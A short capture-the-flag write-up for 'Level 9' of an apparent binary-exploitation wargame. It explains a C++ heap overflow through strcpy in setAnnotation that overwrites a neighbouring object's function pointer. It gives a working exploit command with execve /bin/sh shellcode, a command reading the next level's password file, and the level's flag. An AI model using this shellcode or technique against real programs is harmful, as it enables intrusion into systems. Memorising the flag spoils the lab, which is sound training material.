# Level 9

Here we use the behaviour of OOP creating objects. The new operator working like some sort of malloc will allocate some place in the memory which will be called later as a function since the first thing in the object is a function pointer. We can easily overflow with the strcpy in the setAnotation method in the first object into the second object to put a shellcode in it which will be executed then.

```bash
./level9 $(python -c 'print "\x10\xa0\x04\x08\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\x31\xc9\x31\xd2\xcd\x80" + "a" * 81 + "\x0c\xa0\x04\x08"')
cat /home/user/bonus0/.pass
```

**Flag:** `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`
